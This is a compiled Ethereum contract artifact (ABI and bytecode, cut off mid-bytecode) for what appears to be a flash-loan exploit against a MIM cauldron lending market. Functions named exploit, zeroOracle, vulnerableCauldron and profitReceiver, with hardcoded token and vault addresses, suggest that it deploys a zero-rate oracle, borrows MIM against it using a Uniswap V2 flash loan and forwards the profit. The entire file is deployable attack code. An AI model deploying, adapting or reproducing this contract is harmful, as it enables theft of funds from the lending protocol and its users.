{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"MIM","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract ICauldronLike"}],"stateMutability":"view"},{"type":"function","name":"TARGET_CAULDRON","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"auxiliaryAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"bentoFlashFee","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"borrowedAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"borrowedPart","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"borrowedShare","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"depositedAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"depositedShare","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"execute","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"flashAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"initOracleGetReturnedFalse","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"initOracleRate","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"onFlashLoan","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"token","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"fee","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"pairRepayAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitReceiver","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"pure"},{"type":"function","name":"run","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"selectedPair","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"selectedQuoteToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"usedInitZeroRatePath","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"vulnerableCauldron","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"zeroOracle","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"error","name":"ExecutionFailed","inputs":[{"name":"reason","type":"string","internalType":"string"}]},{"type":"error","name":"SetupFailed","inputs":[{"name":"reason","type":"string","internalType":"string"}]},{"type":"error","name":"Unauthorized","inputs":[]}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506145198061001c5f395ff3fe6080604052600436106101c5575f3560e01c80635ff972cc116100f6578063b570137a11610094578063c4f0d1c611610063578063c4f0d1c6146105e6578063cc1f2afa14610610578063daec383d1461063a578063eaa15e1d14610664576101cc565b8063b570137a1461053e578063bab1ee8814610568578063bd7a598c14610592578063c0406226146105bc576101cc565b80636c0e8226116100d05780636c0e8226146104965780636e5f1ba7146104c0578063aa94f632146104ea578063b0b62eeb14610514576101cc565b80635ff972cc14610418578063614619541461044257806363d9b7701461046c576101cc565b80633c2448ed11610163578063493436241161013d57806349343624146103705780634b54b0cf1461039a57806352d11fb4146103c457806354a33a07146103ee576101cc565b80633c2448ed146102f257806341f30ddf1461031c578063463defd114610346576101cc565b806322cb9ca31161019f57806322cb9ca31461024c57806323e30c8b146102765780633538bc3a1461029e578063355c8973146102c8576101cc565b806310d1e85c146101d05780631afbb7a4146101f85780631d01364c14610222576101cc565b366101cc57005b5f5ffd5b3480156101db575f5ffd5b506101f660048036038101906101f19190612eb4565b61068e565b005b348015610203575f5ffd5b5061020c610a1b565b6040516102199190612f47565b60405180910390f35b34801561022d575f5ffd5b50610236610a21565b6040516102439190612f47565b60405180910390f35b348015610257575f5ffd5b50610260610a27565b60405161026d9190612f6f565b60405180910390f35b348015610281575f5ffd5b5061029c60048036038101906102979190612f88565b610a4c565b005b3480156102a9575f5ffd5b506102b26110cf565b6040516102bf9190612f47565b60405180910390f35b3480156102d3575f5ffd5b506102dc6110d5565b6040516102e99190612f6f565b60405180910390f35b3480156102fd575f5ffd5b506103066110fa565b6040516103139190612f47565b60405180910390f35b348015610327575f5ffd5b50610330611109565b60405161033d9190612f47565b60405180910390f35b348015610351575f5ffd5b5061035a61110f565b6040516103679190613038565b60405180910390f35b34801561037b575f5ffd5b50610384611121565b6040516103919190612f6f565b60405180910390f35b3480156103a5575f5ffd5b506103ae61113c565b6040516103bb9190612f47565b60405180910390f35b3480156103cf575f5ffd5b506103d8611142565b6040516103e59190612f47565b60405180910390f35b3480156103f9575f5ffd5b50610402611148565b60405161040f9190612f47565b60405180910390f35b348015610423575f5ffd5b5061042c61114e565b6040516104399190612f47565b60405180910390f35b34801561044d575f5ffd5b50610456611156565b6040516104639190612f47565b60405180910390f35b348015610477575f5ffd5b50610480611165565b60405161048d9190612f47565b60405180910390f35b3480156104a1575f5ffd5b506104aa611174565b6040516104b79190612f6f565b60405180910390f35b3480156104cb575f5ffd5b506104d4611198565b6040516104e19190613038565b60405180910390f35b3480156104f5575f5ffd5b506104fe6111ab565b60405161050b9190612f6f565b60405180910390f35b34801561051f575f5ffd5b506105286111d0565b6040516105359190612f47565b60405180910390f35b348015610549575f5ffd5b506105526111d6565b60405161055f9190612f47565b60405180910390f35b348015610573575f5ffd5b5061057c6111dc565b6040516105899190612f6f565b60405180910390f35b34801561059d575f5ffd5b506105a6611201565b6040516105b39190612f6f565b60405180910390f35b3480156105c7575f5ffd5b506105d0611219565b6040516105dd9190612f47565b60405180910390f35b3480156105f1575f5ffd5b506105fa611228565b6040516106079190612f47565b60405180910390f35b34801561061b575f5ffd5b5061062461122e565b60405161063191906130ac565b60405180910390f35b348015610645575f5ffd5b5061064e611246565b60405161065b9190612f6f565b60405180910390f35b34801561066f575f5ffd5b5061067861125e565b6040516106859190613038565b60405180910390f35b60035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614158061071657503073ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff1614155b1561074d576040517f82b4290000000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b5f5f850361075b578361075d565b845b90505f5f848481019061077091906130c5565b91509150818314158061078557506006548114155b156107c5576040517ff00364b10000000000000000000000000000000000000000000000000000000081526004016107bc9061315d565b60405180910390fd5b6107ce83611271565b6008819055507346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c73ffffffffffffffffffffffffffffffffffffffff16636b2ace876040518163ffffffff1660e01b8152600401602060405180830381865afa158015610831573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610855919061318f565b73ffffffffffffffffffffffffffffffffffffffff1663f1676d3730307399d8a9c45b2eca8864373a26d1459e3dff1e17f36006548860405160200161089b9190612f47565b6040516020818303038152906040526040518663ffffffff1660e01b81526004016108ca95949392919061324a565b5f604051808303815f87803b1580156108e1575f5ffd5b505af11580156108f3573d5f5f3e3d5ffd5b505050506108ff6112a0565b6008547399d8a9c45b2eca8864373a26d1459e3dff1e17f373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161094f9190612f6f565b602060405180830381865afa15801561096a573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061098e91906132b6565b10156109cf576040517ff00364b10000000000000000000000000000000000000000000000000000000081526004016109c69061332b565b60405180910390fd5b610a117399d8a9c45b2eca8864373a26d1459e3dff1e17f360035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff166008546114d2565b5050505050505050565b600c5481565b600a5481565b60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c73ffffffffffffffffffffffffffffffffffffffff16636b2ace876040518163ffffffff1660e01b8152600401602060405180830381865afa158015610aa9573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610acd919061318f565b73ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141580610b3357503073ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff1614155b80610b7e57507399d8a9c45b2eca8864373a26d1459e3dff1e17f373ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff1614155b15610bb5576040517f82b4290000000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b5f8282810190610bc59190613349565b90508360098190555083811015610c11576040517ff00364b1000000000000000000000000000000000000000000000000000000008152600401610c08906133be565b60405180910390fd5b5f8186610c1e9190613409565b90507346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c73ffffffffffffffffffffffffffffffffffffffff16636b2ace876040518163ffffffff1660e01b8152600401602060405180830381865afa158015610c7d573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610ca1919061318f565b73ffffffffffffffffffffffffffffffffffffffff166302b9446c7399d8a9c45b2eca8864373a26d1459e3dff1e17f33060018054906101000a900473ffffffffffffffffffffffffffffffffffffffff16855f6040518663ffffffff1660e01b8152600401610d15959493929190613475565b60408051808303815f875af1158015610d30573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610d5491906134c6565b9050600b5f82919050555080600a819055505f600b5403610daa576040517ff00364b1000000000000000000000000000000000000000000000000000000008152600401610da19061354e565b60405180910390fd5b5f600a5490506001811115610dc957600181610dc6919061356c565b90505b5f600267ffffffffffffffff811115610de557610de461359f565b5b604051908082528060200260200182016040528015610e135781602001602082028036833780820191505090505b5090505f600267ffffffffffffffff811115610e3257610e3161359f565b5b604051908082528060200260200182016040528015610e605781602001602082028036833780820191505090505b5090505f600267ffffffffffffffff811115610e7f57610e7e61359f565b5b604051908082528060200260200182016040528015610eb257816020015b6060815260200190600190039081610e9d5790505b509050600a835f81518110610eca57610ec96135cc565b5b602002602001019060ff16908160ff1681525050610ee9600b54611625565b306001604051602001610efe93929190613611565b604051602081830303815290604052815f81518110610f2057610f1f6135cc565b5b6020026020010181905250600583600181518110610f4157610f406135cc565b5b602002602001019060ff16908160ff1681525050610f5e84611625565b30604051602001610f70929190613646565b60405160208183030381529060405281600181518110610f9357610f926135cc565b5b602002602001018190525060018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663656f3d648484846040518463ffffffff1660e01b8152600401610ffb939291906138ea565b60408051808303815f875af1158015611016573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061103a91906134c6565b600d5f600e5f84919050558391905055505083600c8190555061105b611691565b600f5f6101000a81548160ff021916908315150217905550600f5f9054906101000a900460ff166110c1576040517ff00364b10000000000000000000000000000000000000000000000000000000081526004016110b8906139a4565b60405180910390fd5b505050505050505050505050565b60075481565b60055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f6111043361195b565b905090565b60105481565b600f5f9054906101000a900460ff1681565b5f7399d8a9c45b2eca8864373a26d1459e3dff1e17f3905090565b60095481565b600e5481565b60085481565b5f5f54905090565b5f6111603361195b565b905090565b5f61116f3361195b565b905090565b60018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600f60029054906101000a900460ff1681565b60035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600d5481565b60065481565b60045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c81565b5f6112233361195b565b905090565b600b5481565b7346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c81565b7399d8a9c45b2eca8864373a26d1459e3dff1e17f381565b600f60019054906101000a900460ff1681565b5f60016103e56103e88461128591906139c2565b61128f9190613a30565b6112999190613409565b9050919050565b5f7346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c73ffffffffffffffffffffffffffffffffffffffff16636b2ace876040518163ffffffff1660e01b8152600401602060405180830381865afa1580156112fe573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611322919061318f565b73ffffffffffffffffffffffffffffffffffffffff1663f7888aec7399d8a9c45b2eca8864373a26d1459e3dff1e17f3306040518363ffffffff1660e01b8152600401611370929190613a60565b602060405180830381865afa15801561138b573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906113af91906132b6565b90505f81146114cf577346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c73ffffffffffffffffffffffffffffffffffffffff16636b2ace876040518163ffffffff1660e01b8152600401602060405180830381865afa158015611415573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611439919061318f565b73ffffffffffffffffffffffffffffffffffffffff166397da6d307399d8a9c45b2eca8864373a26d1459e3dff1e17f330305f866040518663ffffffff1660e01b815260040161148d959493929190613a87565b60408051808303815f875af11580156114a8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906114cc91906134c6565b50505b50565b5f5f8473ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60e01b8585604051602401611506929190613ad8565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516115709190613b39565b5f604051808303815f865af19150503d805f81146115a9576040519150601f19603f3d011682016040523d82523d5f602084013e6115ae565b606091505b50915091508115806115de57505f8151141580156115dd5750808060200190518101906115db9190613b79565b155b5b1561161e576040517ff00364b100000000000000000000000000000000000000000000000000000000815260040161161590613bee565b60405180910390fd5b5050505050565b5f7f7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff821115611689576040517ff00364b100000000000000000000000000000000000000000000000000000000815260040161168090613c56565b60405180910390fd5b819050919050565b5f5f60018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ba0b9a96040518163ffffffff1660e01b8152600401602060405180830381865afa1580156116fc573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061172091906132b6565b90505f60018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631c9e379b306040518263ffffffff1660e01b815260040161177c9190612f6f565b602060405180830381865afa158015611797573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906117bb91906132b6565b90505f60018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166348e4163e306040518263ffffffff1660e01b81526004016118179190612f6f565b602060405180830381865afa158015611832573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061185691906132b6565b90505f60018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166338b51ce1306040518263ffffffff1660e01b81526004016118b29190612f6f565b602060405180830381865afa1580156118cd573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906118f19190613b79565b9050600f60019054906101000a900460ff16801561191b5750600f60029054906101000a900460ff165b801561192857505f601054145b801561193357505f84145b801561193e57505f83115b801561194957505f82115b80156119525750805b94505050505090565b5f60015f9054906101000a900460ff1615611979575f549050611d79565b6001805f6101000a81548160ff0219169083151502179055508160055f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506119da611d7e565b6119e2612385565b6119ea612446565b5f60065414806119fb57505f600754145b80611a5257505f73ffffffffffffffffffffffffffffffffffffffff1660035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16145b15611a92576040517f36aae05c000000000000000000000000000000000000000000000000000000008152600401611a8990613cbe565b60405180910390fd5b5f60035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa158015611afd573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611b21919061318f565b90505f7399d8a9c45b2eca8864373a26d1459e3dff1e17f373ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614611b71575f611b75565b6007545b90505f7399d8a9c45b2eca8864373a26d1459e3dff1e17f373ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614611bc757600754611bc9565b5f5b905060035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663022c0d9f838330600754600654604051602001611c22929190613cdc565b6040516020818303038152906040526040518563ffffffff1660e01b8152600401611c509493929190613d03565b5f604051808303815f87803b158015611c67575f5ffd5b505af1158015611c79573d5f5f3e3d5ffd5b505050507399d8a9c45b2eca8864373a26d1459e3dff1e17f373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401611cca9190612f6f565b602060405180830381865afa158015611ce5573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611d0991906132b6565b5f819055505f5f5403611d51576040517ff00364b1000000000000000000000000000000000000000000000000000000008152600401611d4890613d97565b60405180910390fd5b611d717399d8a9c45b2eca8864373a26d1459e3dff1e17f3865f546114d2565b5f5493505050505b919050565b5f73ffffffffffffffffffffffffffffffffffffffff1660018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff160361238357604051611ddd90612db1565b604051809103905ff080158015611df6573d5f5f3e3d5ffd5b5060025f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f5f60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d6d7d52560405180602001604052805f8152506040518263ffffffff1660e01b8152600401611ea09190613db5565b60408051808303815f875af1158015611ebb573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611edf9190613dd5565b915091508115600f60026101000a81548160ff021916908315150217905550806010819055508180611f1157505f8114155b15611f51576040517f36aae05c000000000000000000000000000000000000000000000000000000008152600401611f4890613e83565b60405180910390fd5b5f7346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c73ffffffffffffffffffffffffffffffffffffffff16636b2ace876040518163ffffffff1660e01b8152600401602060405180830381865afa158015611faf573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611fd3919061318f565b90505f8173ffffffffffffffffffffffffffffffffffffffff1663bafe4f147346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c6040518263ffffffff1660e01b81526004016120239190612f6f565b602060405180830381865afa15801561203e573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612062919061318f565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036120d2576040517f36aae05c0000000000000000000000000000000000000000000000000000000081526004016120c990613eeb565b60405180910390fd5b5f7399d8a9c45b2eca8864373a26d1459e3dff1e17f360025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660405180602001604052805f8152505f6201b580620124f85f6040516020016121399796959493929190613f2b565b60405160208183030381529060405290508273ffffffffffffffffffffffffffffffffffffffff16631f54245b83835f6040518463ffffffff1660e01b815260040161218793929190613f9f565b6020604051808303815f875af11580156121a3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906121c7919061318f565b6001806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f73ffffffffffffffffffffffffffffffffffffffff1660018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1603612294576040517f36aae05c00000000000000000000000000000000000000000000000000000000815260040161228b90614025565b60405180910390fd5b5f60018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ba0b9a96040518163ffffffff1660e01b8152600401602060405180830381865afa1580156122fe573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061232291906132b6565b14612362576040517f36aae05c0000000000000000000000000000000000000000000000000000000081526004016123599061408d565b60405180910390fd5b6001600f60016101000a81548160ff02191690831515021790555050505050505b565b6124447399d8a9c45b2eca8864373a26d1459e3dff1e17f37346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c73ffffffffffffffffffffffffffffffffffffffff16636b2ace876040518163ffffffff1660e01b8152600401602060405180830381865afa1580156123fa573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061241e919061318f565b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff612945565b565b5f5f5f61247e73c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28484876129f6565b8095508193508294505050506124bf73c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac73a0b86991c6218b36c1d19d4a2e9eb0ce3606eb488484876129f6565b80955081935082945050505061250073c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac73dac17f958d2ee523a2206206994597c13d831ec78484876129f6565b80955081935082945050505061254173c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac736b175474e89094c44da98b954eedeac495271d0f8484876129f6565b809550819350829450505050612582735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28484876129f6565b8095508193508294505050506125c3735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73a0b86991c6218b36c1d19d4a2e9eb0ce3606eb488484876129f6565b809550819350829450505050612604735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73dac17f958d2ee523a2206206994597c13d831ec78484876129f6565b809550819350829450505050612645735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f736b175474e89094c44da98b954eedeac495271d0f8484876129f6565b8095508193508294505050505f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16148061268a57505f83145b156126ca576040517f36aae05c0000000000000000000000000000000000000000000000000000000081526004016126c1906140f5565b60405180910390fd5b5f7399d8a9c45b2eca8864373a26d1459e3dff1e17f373ffffffffffffffffffffffffffffffffffffffff166370a082317346f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c73ffffffffffffffffffffffffffffffffffffffff16636b2ace876040518163ffffffff1660e01b8152600401602060405180830381865afa158015612758573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061277c919061318f565b6040518263ffffffff1660e01b81526004016127989190612f6f565b602060405180830381865afa1580156127b3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906127d791906132b6565b90505f810361281b576040517f36aae05c0000000000000000000000000000000000000000000000000000000081526004016128129061415d565b60405180910390fd5b5f6005826128299190613a30565b90505f6002866128399190613a30565b90505f818310612849578161284b565b825b905060148111612890576040517f36aae05c000000000000000000000000000000000000000000000000000000008152600401612887906141c5565b60405180910390fd5b8560035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508460045f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806006819055506014816129249190613a30565b6007819055505f6007540361293c5760016007819055505b50505050505050565b8273ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e30846040518363ffffffff1660e01b8152600401612980929190613a60565b602060405180830381865afa9250505080156129ba57506040513d601f19601f820116820180604052508101906129b791906132b6565b60015b156129da576002826129cc9190613a30565b81106129d857506129f1565b505b6129e583835f612a31565b6129f0838383612a31565b5b505050565b5f5f5f8592508491508390505f5f612a0e8a8a612b84565b9150915082811115612a24578194508893508092505b5050955095509592505050565b5f5f8473ffffffffffffffffffffffffffffffffffffffff1663095ea7b360e01b8585604051602401612a65929190613ad8565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051612acf9190613b39565b5f604051808303815f865af19150503d805f8114612b08576040519150601f19603f3d011682016040523d82523d5f602084013e612b0d565b606091505b5091509150811580612b3d57505f815114158015612b3c575080806020019051810190612b3a9190613b79565b155b5b15612b7d576040517ff00364b1000000000000000000000000000000000000000000000000000000008152600401612b749061422d565b60405180910390fd5b5050505050565b5f5f8373ffffffffffffffffffffffffffffffffffffffff1663e6a439057399d8a9c45b2eca8864373a26d1459e3dff1e17f3856040518363ffffffff1660e01b8152600401612bd5929190613a60565b602060405180830381865afa158015612bf0573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612c14919061318f565b91505f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603612c54575f5f91509150612daa565b5f5f8373ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015612c9f573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612cc391906142c7565b50915091507399d8a9c45b2eca8864373a26d1459e3dff1e17f373ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa158015612d3c573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612d60919061318f565b73ffffffffffffffffffffffffffffffffffffffff1603612d9357816dffffffffffffffffffffffffffff169250612da7565b806dffffffffffffffffffffffffffff1692505b50505b9250929050565b6101cc8061431883390190565b5f5ffd5b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f612def82612dc6565b9050919050565b612dff81612de5565b8114612e09575f5ffd5b50565b5f81359050612e1a81612df6565b92915050565b5f819050919050565b612e3281612e20565b8114612e3c575f5ffd5b50565b5f81359050612e4d81612e29565b92915050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f840112612e7457612e73612e53565b5b8235905067ffffffffffffffff811115612e9157612e90612e57565b5b602083019150836001820283011115612ead57612eac612e5b565b5b9250929050565b5f5f5f5f5f60808688031215612ecd57612ecc612dbe565b5b5f612eda88828901612e0c565b9550506020612eeb88828901612e3f565b9450506040612efc88828901612e3f565b935050606086013567ffffffffffffffff811115612f1d57612f1c612dc2565b5b612f2988828901612e5f565b92509250509295509295909350565b612f4181612e20565b82525050565b5f602082019050612f5a5f830184612f38565b92915050565b612f6981612de5565b82525050565b5f602082019050612f825f830184612f60565b92915050565b5f5f5f5f5f5f60a08789031215612fa257612fa1612dbe565b5b5f612faf89828a01612e0c565b9650506020612fc089828a01612e0c565b9550506040612fd189828a01612e3f565b9450506060612fe289828a01612e3f565b935050608087013567ffffffffffffffff81111561300357613002612dc2565b5b61300f89828a01612e5f565b92509250509295509295509295565b5f8115159050919050565b6130328161301e565b82525050565b5f60208201905061304b5f830184613029565b92915050565b5f819050919050565b5f61307461306f61306a84612dc6565b613051565b612dc6565b9050919050565b5f6130858261305a565b9050919050565b5f6130968261307b565b9050919050565b6130a68161308c565b82525050565b5f6020820190506130bf5f83018461309d565b92915050565b5f5f604083850312156130db576130da612dbe565b5b5f6130e885828601612e3f565b92505060206130f985828601612e3f565b9150509250929050565b5f82825260208201905092915050565b7f504149525f43414c4c4241434b5f4d49534d41544348000000000000000000005f82015250565b5f613147601683613103565b915061315282613113565b602082019050919050565b5f6020820190508181035f8301526131748161313b565b9050919050565b5f8151905061318981612df6565b92915050565b5f602082840312156131a4576131a3612dbe565b5b5f6131b18482850161317b565b91505092915050565b5f6131c48261307b565b9050919050565b6131d4816131ba565b82525050565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f61321c826131da565b61322681856131e4565b93506132368185602086016131f4565b61323f81613202565b840191505092915050565b5f60a08201905061325d5f8301886131cb565b61326a6020830187612f60565b6132776040830186612f60565b6132846060830185612f38565b81810360808301526132968184613212565b90509695505050505050565b5f815190506132b081612e29565b92915050565b5f602082840312156132cb576132ca612dbe565b5b5f6132d8848285016132a2565b91505092915050565b7f494e53554646494349454e545f4d494d5f544f5f52455041595f